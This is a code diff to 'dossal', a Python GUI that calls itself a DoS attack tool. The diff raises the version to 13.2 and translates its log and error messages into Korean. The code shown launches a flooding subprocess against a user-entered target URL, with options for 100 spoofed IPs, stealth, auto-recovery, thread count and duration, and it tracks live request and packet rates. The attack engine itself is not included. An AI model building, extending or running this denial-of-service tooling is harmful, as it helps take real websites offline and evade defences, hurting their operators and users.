@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v13.1 — GUI DoS Attack Tool (Windows-first, cross-platform)
+dossal v13.2 — GUI DoS Attack Tool (Windows-first, cross-platform)
 Requires: Python 3.8+, h2 (pip install h2)
 Run: python dossal_gui.py
 """
@@ -24,7 +24,7 @@ class DossalGUI:
     def __init__(self, root):
         """dossal GUI 초기화 (tkinter)."""
         self.root = root
-        root.title("dossal v13.1 — 종합 DoS 공격 도구")
+        root.title("dossal v13.2 — 종합 DoS 공격 도구")
         root.geometry("600x500")
         root.resizable(True, True)
         
@@ -402,7 +402,7 @@ class DossalGUI:
         
         url = self.url_var.get().strip()
         if not url:
-            messagebox.showerror("Error", "Enter a target URL")
+            messagebox.showerror("오류", "대상 URL을 입력하세요")
             return
         
         try:
@@ -483,14 +483,14 @@ class DossalGUI:
         self.stop_btn.config(state=tk.NORMAL)
         self.progress.config(maximum=duration, value=0)
         
-        self.log(f"Starting attack: {url}")
-        self.log(f"Mode: {mode if not fast else 'auto'} | Threads: {threads} | Duration: {duration}s")
+        self.log(f"공격 시작: {url}")
+        self.log(f"모드: {mode if not fast else 'auto'} | 프로세스: {threads} | 시간: {duration}초")
         if spoof:
-            self.log("Spoofed IPs: 100")
+            self.log("스푸핑 IP: 100개")
         if stealth:
-            self.log("Stealth: ON")
+            self.log("스텔스: ON")
         if recovery:
-            self.log("Recovery: ON")
+            self.log("자동회복: ON")
         
         self.attack_thread = threading.Thread(target=self._run_attack, args=(cmd,), daemon=True)
         self.attack_thread.start()
@@ -534,21 +534,21 @@ class DossalGUI:
                     if active_m:
                         self.stats['active_ips'] = f"{active_m.group(1)}/{active_m.group(2)}"  # type: ignore
                     
-                    self.log(f"Live: RPS={self.stats.get('rps',0):,} PPS={self.stats.get('packets',0):,} 429_IP={self.stats.get('429_ips',0)}")
+                    self.log(f"실시간: RPS={self.stats.get('rps',0):,} PPS={self.stats.get('packets',0):,} 429_IP={self.stats.get('429_ips',0)}")
                     self.root.after(0, self._update_stats)
                 elif line.startswith('{'):
                     # Final JSON result
                     try:
                         data = json.loads(line)
                         self.stats.update(data)
-                        self.log(f"Complete: {data.get('rps', 0):,.0f} RPS, {data.get('packets', 0):,} packets")
+                        self.log(f"완료: {data.get('rps', 0):,.0f} RPS, {data.get('packets', 0):,} 패킷")
                     except:
                         pass
             
             proc.wait()
             
         except Exception as e:
-            self.log(f"Error: {e}")
+            self.log(f"오류: {e}")
         finally:
             self.running = False
             self.root.after(0, self._on_complete)
@@ -582,7 +582,7 @@ class DossalGUI:
         """공격 없이 시뮬레이션 (패킷 수/시간/영향력 예측)."""
         url = self.url_var.get().strip()
         if not url:
-            messagebox.showerror("Error", "Enter a target URL")
+            messagebox.showerror("오류", "대상 URL을 입력하세요")
             return
         
         cmd = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dossal.py')]
@@ -595,7 +595,7 @@ class DossalGUI:
         if self.recovery_var.get():
             cmd.append('--recovery')
         
-        self.log("Running simulation...")
+        self.log("시뮬레이션 실행 중...")
         threading.Thread(target=self._run_dry, args=(cmd,), daemon=True).start()
     
     """Dry-run 백그라운드 실행."""
@@ -606,14 +606,14 @@ class DossalGUI:
             for line in proc.stderr.split('\n'):
                 if line.strip():
                     self.log(line.strip())
-            self.log("Simulation complete")
+            self.log("시뮬레이션 완료")
         except Exception as e:
-            self.log(f"Simulation error: {e}")
+            self.log(f"시뮬레이션 오류: {e}")
     
     """공격 중단 (subprocess terminate)."""
     def stop_attack(self):
         """공격 중단 (SIGINT + 프로세스 종료)."""
-        self.log("Stopping...")
+        self.log("중단 중...")
         self.running = False
         # Kill the subprocess (simplified)
         # In production, send SIGTERM or use process group
@@ -829,7 +829,7 @@ class DossalGUI:
         }
         with open(path, 'w') as f:
             json.dump(profile, f, indent=2)
-        self.log(f"Profile saved: {path}")
+        self.log(f"프로파일 저장: {path}")
     
     def load_profile(self):
         """프로파일(.json)에서 설정 불러오기."""
@@ -851,9 +851,9 @@ class DossalGUI:
             self.targets_var.set(p.get('targets', ''))
             self.proxy_var.set(p.get('proxy', ''))
             self.mode_var.set(p.get('mode', 'auto'))
-            self.log(f"Profile loaded: {path}")
+            self.log(f"프로파일 불러오기: {path}")
         except Exception as e:
-            self.log(f"Profile error: {e}")
+            self.log(f"프로파일 오류: {e}")
     
     """공격 리포트 저장 (.json)."""
     def save_report(self):
@@ -865,9 +865,9 @@ class DossalGUI:
                 with open(path, 'w') as f:
                     f.write(f"<h1>dossal Report</h1>")
                     f.write(f"<pre>{json.dumps(self.stats, indent=2)}</pre>")
-                self.log(f"Report saved: {path}")
+                self.log(f"리포트 저장: {path}")
         except Exception as e:
-            self.log(f"Report error: {e}")
+            self.log(f"리포트 오류: {e}")
 
 def main():
     """dossal_gui 메인 진입점 (tkinter 루프)."""
